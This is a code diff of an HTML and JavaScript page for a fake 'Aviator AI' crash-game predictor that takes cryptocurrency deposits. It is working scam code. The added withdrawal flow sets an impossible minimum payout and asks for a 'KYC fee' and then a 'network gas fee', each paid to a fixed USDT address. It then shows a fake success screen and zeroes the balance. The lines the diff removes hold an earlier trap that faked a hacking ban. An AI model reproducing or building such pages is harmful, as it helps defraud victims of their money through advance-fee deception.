@@ -3,21 +3,19 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Aviator AI Pro - V6 Extreme</title>
+    <title>Aviator VIP Server</title>
     <style>
         :root { --primary: #ff0040; --bg: #0b0c0d; --gold: #f3ba2f; --neon: #00f2ff; --green: #28a745; --binance: #f0b90b; }
         body { background: var(--bg); color: white; font-family: 'Segoe UI', Arial, sans-serif; margin: 0; text-align: center; overflow-x: hidden; }
         
-        /* Navbar */
+        /* Nav & Balance */
         .nav { background: #1b1c1d; padding: 15px; display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid #333; position: sticky; top: 0; z-index: 1000; }
-        .bal-box { color: var(--gold); font-weight: bold; border: 1px solid var(--gold); padding: 5px 15px; border-radius: 20px; }
+        .bal-box { color: var(--gold); font-weight: bold; border: 1px solid var(--gold); padding: 5px 15px; border-radius: 20px; font-size: 1.1rem; }
         
-        /* Tabs */
-        .tab-bar { display: flex; justify-content: center; background: #111; padding: 10px; gap: 8px; }
+        .tab-bar { display: flex; justify-content: center; background: #111; padding: 10px; gap: 8px; border-bottom: 1px solid #222; }
         .tab-btn { background: #222; color: #888; border: none; padding: 10px 14px; border-radius: 8px; cursor: pointer; font-weight: bold; font-size: 0.75rem; }
-        .tab-btn.active { background: var(--primary); color: white; }
+        .tab-btn.active { background: var(--primary); color: white; box-shadow: 0 0 10px var(--primary); }
 
-        /* Pages */
         .page { display: none; padding: 20px; animation: slideUp 0.4s; }
         .page.active { display: block; }
         @keyframes slideUp { from { opacity: 0; transform: translateY(15px); } to { opacity: 1; transform: translateY(0); } }
@@ -26,38 +24,26 @@
         .predictor-card { background: #000; border: 2px solid var(--neon); border-radius: 15px; width: 190px; margin: 0 auto 15px; padding: 10px; box-shadow: 0 0 15px var(--neon); }
         #next-pred { font-size: 2.5rem; color: var(--neon); font-weight: 900; }
         #game-box { position: relative; width: 100%; max-width: 600px; height: 280px; background: radial-gradient(circle, #1a1a1a, #000); margin: 0 auto; border-radius: 15px; border: 1px solid #333; overflow: hidden; }
-        #multiplier { position: absolute; top: 40%; left: 50%; transform: translate(-50%, -50%); font-size: 4rem; font-weight: 900; z-index: 10; }
+        #multiplier { position: absolute; top: 40%; left: 50%; transform: translate(-50%, -50%); font-size: 4.5rem; font-weight: 900; z-index: 10; }
         
-        /* Forms & Cards */
         .card-ui { max-width: 400px; margin: auto; background: #1b1c1d; padding: 25px; border-radius: 20px; border: 1px solid #333; text-align: left; }
-        input, select { width: 100%; padding: 14px; background: #000; border: 1px solid #333; border-radius: 10px; color: white; margin: 10px 0; box-sizing: border-box; }
-        .btn-main { width: 100%; padding: 18px; font-size: 1.2rem; font-weight: bold; border: none; border-radius: 12px; cursor: pointer; color: white; transition: 0.2s; }
+        input { width: 100%; padding: 14px; background: #000; border: 1px solid #333; border-radius: 10px; color: white; margin: 10px 0; box-sizing: border-box; }
+        .btn-main { width: 100%; padding: 18px; font-size: 1.2rem; font-weight: bold; border: none; border-radius: 12px; cursor: pointer; color: white; }
 
-        /* Footer */
-        .footer { margin-top: 40px; padding: 20px; border-top: 1px solid #222; }
-        .logo-row img { height: 22px; margin: 0 10px; }
-
-        /* Ban Overlay */
-        #banOverlay { display: none; position: fixed; inset: 0; background: #000; z-index: 20000; flex-direction: column; justify-content: center; align-items: center; padding: 30px; }
-
-        /* Modal */
+        /* Modals */
         .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 5000; justify-content: center; align-items: center; padding: 20px; }
         .modal-content { background: #1b1c1d; padding: 25px; border-radius: 20px; width: 100%; max-width: 350px; border: 1px solid #444; }
+
+        .footer { margin-top: 40px; padding: 20px; opacity: 0.5; }
+        .logo-row img { height: 20px; margin: 0 10px; }
     </style>
 </head>
 <body>
 
     <audio id="paisaSong" src="https://www.myinstants.com/media/sounds/paisa-paisa.mp3" preload="auto"></audio>
 
-    <div id="banOverlay">
-        <h1 style="color:var(--primary); font-size: 3rem; margin: 0;">ACCESS DENIED</h1>
-        <p style="font-size: 1.1rem; color: #fff; margin-top: 20px;">HACKING DETECTED</p>
-        <p style="color: #666; max-width: 320px;">Your account has been flagged for using AI hacking tools. All funds have been frozen by cyber security protocol.</p>
-        <button onclick="unban()" style="background:var(--green); color:white; border:none; padding:12px 25px; border-radius:8px; margin-top:40px; cursor:pointer;">Return to Game</button>
-    </div>
-
     <div class="nav">
-        <div style="font-weight:900; color:var(--primary); font-size: 1.2rem;">AVIATOR AI PRO</div>
+        <div style="font-weight:900; color:var(--primary); font-size: 1.2rem;">AVIATOR AI</div>
         <div class="bal-box">৳ <span id="balance">0.00</span></div>
     </div>
 
@@ -70,63 +56,69 @@
     <div id="game" class="page active">
         <div class="predictor-card">
             <div id="next-pred">SCANNING</div>
-            <div style="font-size:0.5rem; color:var(--green);">SECURE CONNECTION</div>
+            <div style="font-size:0.5rem; color:var(--green);">SECURE SIGNAL</div>
         </div>
         <div id="game-box">
             <div id="multiplier">1.00x</div>
             <canvas id="gameCanvas"></canvas>
         </div>
         <div class="card-ui" style="background:transparent; border:none; padding:15px;">
-            <input type="number" id="betAmt" value="100">
+            <input type="number" id="betAmt" value="1000">
             <button id="actionBtn" class="btn-main" style="background: var(--green);">PLACE BET</button>
-        </div>
-    </div>
-
-    <div id="deposit" class="page">
-        <div class="card-ui">
-            <h3 style="color:var(--binance); margin-top:0;">Binance Deposit</h3>
-            <div style="background:#000; padding:15px; border-radius:10px; border:1px solid var(--binance);">
-                <small style="color:var(--binance)">USDT (BEP20) Address:</small><br>
-                <span style="font-size:0.65rem; word-break:break-all;">0x71C7656EC7ab88b098defB751B7401B5f6d8976F</span>
-            </div>
-            <button onclick="alert('Payment Received! Activating...')" class="btn-main" style="background:var(--binance); color:#000; margin-top:15px;">CONFIRM PAYMENT</button>
         </div>
     </div>
 
     <div id="withdraw" class="page">
         <div class="card-ui">
-            <h2>Withdraw Profit</h2>
-            <input type="text" placeholder="Binance ID / Email">
-            <input type="number" placeholder="Amount (Min ৳800)">
-            <button onclick="handleWithdraw()" class="btn-main" style="background:#333;">SUBMIT REQUEST</button>
+            <h2>Withdraw</h2>
+            <p style="font-size:0.85rem; color:var(--primary); font-weight:bold;">Min Payout: ৳ 15,00,000.00</p>
+            <input type="text" placeholder="Binance Wallet Address">
+            <input type="number" placeholder="Amount">
+            <button onclick="handleWithdraw()" class="btn-main" style="background:#333;">WITHDRAW NOW</button>
         </div>
     </div>
 
-    <div class="footer">
-        <div class="logo-row">
-            <img src="https://cryptologos.cc/logos/binance-coin-bnb-logo.svg?v=032" alt="Binance">
-            <img src="https://www.gstatic.com/images/branding/googlelogo/svg/googlelogo_clr_74x24px.svg" alt="Google">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" style="filter: invert(1);" alt="Apple">
-        </div>
-    </div>
-
-    <div id="modalDelay" class="modal">
-        <div class="modal-content">
-            <h3 style="color:var(--gold);">Processing...</h3>
-            <p>Withdrawal in security queue. For first-time profit, please **wait 1 hour** for server verification.</p>
-            <button onclick="closeModals()" class="btn-main" style="background:#444;">OK</button>
-        </div>
-    </div>
-
-    <div id="modalKYC" class="modal">
-        <div class="modal-content">
-            <h3 style="color:var(--primary); margin-top:0;">Identity Verification</h3>
-            <p style="font-size:0.8rem; color:#aaa;">To release your ৳<span id="pendingBal">0</span>, pay the Global KYC fee.</p>
-            <div style="background:#000; padding:15px; border-radius:10px; color:var(--gold); border:1px solid var(--gold); margin-bottom:15px; text-align:center;">
-                <small>KYC Fee:</small><br><strong>৳ 350.00</strong>
+    <div id="deposit" class="page">
+        <div class="card-ui">
+            <h3 style="color:var(--binance);">Instant Deposit</h3>
+            <div style="background:#000; padding:15px; border-radius:10px; border:1px solid var(--binance);">
+                <small style="color:var(--binance)">USDT (BEP20) Address:</small><br>
+                <span style="font-size:0.6rem; word-break:break-all;">0x71C7656EC7ab88b098defB751B7401B5f6d8976F</span>
             </div>
-            <input type="text" id="kycTrx" placeholder="Binance Trx ID">
-            <button onclick="finalBan()" class="btn-main" style="background:var(--green); font-size:1rem;">PAY & SUBMIT</button>
+            <button onclick="alert('System verifying...')" class="btn-main" style="background:var(--binance); color:#000; margin-top:15px;">CONFIRM</button>
+        </div>
+    </div>
+
+    <div id="modalSuccess" class="modal">
+        <div class="modal-content" style="text-align:center;">
+            <div style="font-size: 4rem; color: var(--green);">✔</div>
+            <h2 style="color:var(--green);">Withdrawal Success</h2>
+            <p>Your ৳<span id="finalAmt">0</span> has been sent to your Binance wallet. It may take 5-10 minutes to reflect.</p>
+            <button onclick="location.reload()" class="btn-main" style="background:var(--green);">OK</button>
+        </div>
+    </div>
+
+    <div id="modalKYC1" class="modal">
+        <div class="modal-content">
+            <h3 style="color:var(--gold);">KYC Verification (Step 1)</h3>
+            <p style="font-size:0.8rem;">To release your profit, pay the Global KYC fee.</p>
+            <div style="background:#000; padding:15px; border-radius:10px; color:var(--gold); border:1px solid var(--gold); margin-bottom:15px; text-align:center;">
+                <small>KYC Fee:</small><br><strong style="font-size:1.5rem;">৳ 1000.00</strong>
+            </div>
+            <input type="text" id="trx1" placeholder="Enter Binance TxID">
+            <button onclick="step2()" class="btn-main" style="background:var(--green);">PAY & PROCEED</button>
+        </div>
+    </div>
+
+    <div id="modalKYC2" class="modal">
+        <div class="modal-content">
+            <h3 style="color:var(--primary);">Final Server Fee</h3>
+            <p style="font-size:0.8rem;">Verification Step 1 Complete! Now pay the **Network Gas Fee (৳350)** to finalize the blockchain transfer.</p>
+            <div style="background:#000; padding:15px; border-radius:10px; color:var(--primary); border:1px solid var(--primary); margin-bottom:15px; text-align:center;">
+                <small>Final Gas Fee:</small><br><strong style="font-size:1.5rem;">৳ 350.00</strong>
+            </div>
+            <input type="text" id="trx2" placeholder="Enter Binance TxID">
+            <button onclick="finalSuccess()" class="btn-main" style="background:var(--primary);">PAY & WITHDRAW</button>
         </div>
     </div>
 
@@ -146,65 +138,50 @@
     const userRef = ref(db, 'users/user_01');
 
     let balance = 0, isFlying = false, startTime, currentBet = 0;
-    let predSignal = 0, actualCrash = 0;
     const paisaSong = document.getElementById('paisaSong');
 
     onValue(userRef, (s) => {
         balance = s.val().balance;
-        document.getElementById('balance').innerText = balance.toFixed(2);
+        document.getElementById('balance').innerText = balance.toLocaleString();
     });
 
+    // --- WITHDRAW LOGIC ---
+    window.handleWithdraw = () => {
+        if(balance < 1500000) return alert("Minimum withdrawal is ৳15,00,000");
+        document.getElementById('modalKYC1').style.display = 'flex';
+    };
+
+    window.step2 = () => {
+        if(document.getElementById('trx1').value.length < 5) return alert("Invalid TxID");
+        document.getElementById('modalKYC1').style.display = 'none';
+        document.getElementById('modalKYC2').style.display = 'flex';
+    };
+
+    window.finalSuccess = () => {
+        if(document.getElementById('trx2').value.length < 5) return alert("Invalid TxID");
+        document.getElementById('modalKYC2').style.display = 'none';
+        document.getElementById('finalAmt').innerText = balance.toLocaleString();
+        document.getElementById('modalSuccess').style.display = 'flex';
+        // Reset balance on success (Visual only or update DB)
+        update(userRef, {balance: 0});
+    };
+
     // --- GAME ENGINE ---
+    let predSignal = 0, actualCrash = 0;
     function setupRound() {
-        predSignal = (Math.random() * (12.00 - 1.50) + 1.50).toFixed(2);
-        actualCrash = (Math.random() < 0.2) ? (1.05 + Math.random()*0.1).toFixed(2) : predSignal;
+        predSignal = (Math.random() * (15.00 - 1.50) + 1.50).toFixed(2);
+        actualCrash = (Math.random() < 0.2) ? (1.10).toFixed(2) : predSignal;
         document.getElementById('next-pred').innerText = predSignal + "x";
-        document.getElementById('multiplier').innerText = "1.00x";
-        document.getElementById('multiplier').style.color = "white";
     }
     setupRound();
 
-    // --- WITHDRAW TRAP LOGIC ---
-    let withdrawStatus = localStorage.getItem('withdrawStatus') || 'none';
-
-    window.handleWithdraw = () => {
-        if(withdrawStatus == 'none') {
-            document.getElementById('modalDelay').style.display = 'flex';
-            withdrawStatus = 'waiting';
-            localStorage.setItem('withdrawStatus', 'waiting');
-        } else {
-            document.getElementById('pendingBal').innerText = balance.toFixed(2);
-            document.getElementById('modalKYC').style.display = 'flex';
-        }
-    };
-
-    window.finalBan = () => {
-        if(document.getElementById('kycTrx').value.length < 5) return alert("Enter valid Transaction ID");
-        localStorage.setItem('isBanned', 'true');
-        document.getElementById('banOverlay').style.display = 'flex';
-    };
-
-    window.unban = () => {
-        localStorage.removeItem('isBanned');
-        localStorage.setItem('withdrawStatus', 'none'); // Reset to loop the trap
-        withdrawStatus = 'none';
-        document.getElementById('banOverlay').style.display = 'none';
-    };
-
-    if(localStorage.getItem('isBanned') == 'true') {
-        document.getElementById('banOverlay').style.display = 'flex';
-    }
-
-    // --- UI HELPERS ---
     window.showPage = (p, b) => {
         document.querySelectorAll('.page').forEach(x => x.classList.remove('active'));
         document.querySelectorAll('.tab-btn').forEach(x => x.classList.remove('active'));
         document.getElementById(p).classList.add('active');
         if(b) b.classList.add('active');
     };
-    window.closeModals = () => document.querySelectorAll('.modal').forEach(m => m.style.display='none');
 
-    // --- CANVAS ENGINE ---
     const canvas = document.getElementById('gameCanvas');
     const ctx = canvas.getContext('2d');
     canvas.width = 600; canvas.height = 280;
@@ -212,25 +189,16 @@
     document.getElementById('actionBtn').onclick = () => {
         if(!isFlying) {
             let amt = parseFloat(document.getElementById('betAmt').value);
-            if(balance < amt) return alert("Please Deposit First");
+            if(balance < amt) return alert("Deposit Required");
             currentBet = amt; balance -= amt; update(userRef, {balance});
-            isFlying = true; startTime = Date.now();
-            document.getElementById('actionBtn').innerText = "CASH OUT";
-            document.getElementById('actionBtn').style.background = "#ff9800";
-            animate();
+            isFlying = true; startTime = Date.now(); animate();
         } else {
-            // WIN CASE
             let winM = parseFloat(document.getElementById('multiplier').innerText);
-            balance += (currentBet * winM);
-            update(userRef, {balance});
-            isFlying = false;
-            
-            // Paisa Sound
-            paisaSong.currentTime = 0;
-            paisaSong.play();
-            setTimeout(() => { paisaSong.pause(); }, 4000);
-            
-            alert("VICTORY! ৳" + (currentBet * winM).toFixed(2));
+            balance += (currentBet * winM); update(userRef, {balance});
+            isFlying = false; 
+            paisaSong.currentTime = 0; paisaSong.play();
+            setTimeout(() => paisaSong.pause(), 4000);
+            alert("Victory!");
         }
     };
 
@@ -239,18 +207,11 @@
         let elapsed = (Date.now() - startTime) / 1000;
         let val = (1 + Math.pow(elapsed, 1.4) * 0.15).toFixed(2);
         document.getElementById('multiplier').innerText = val + "x";
-        
         ctx.clearRect(0,0,600,280); ctx.beginPath(); ctx.strokeStyle = "#ff0040"; ctx.lineWidth = 6;
         ctx.moveTo(0, 280); ctx.quadraticCurveTo(elapsed*60, 280, elapsed*120, 280-(elapsed*45)); ctx.stroke();
-
         if (parseFloat(val) >= actualCrash) {
             isFlying = false;
-            document.getElementById('multiplier').style.color = "red";
-            setTimeout(() => {
-                document.getElementById('actionBtn').innerText = "PLACE BET";
-                document.getElementById('actionBtn').style.background = "var(--green)";
-                setupRound();
-            }, 2500);
+            setTimeout(() => { setupRound(); }, 2500);
         } else requestAnimationFrame(animate);
     }
 </script>
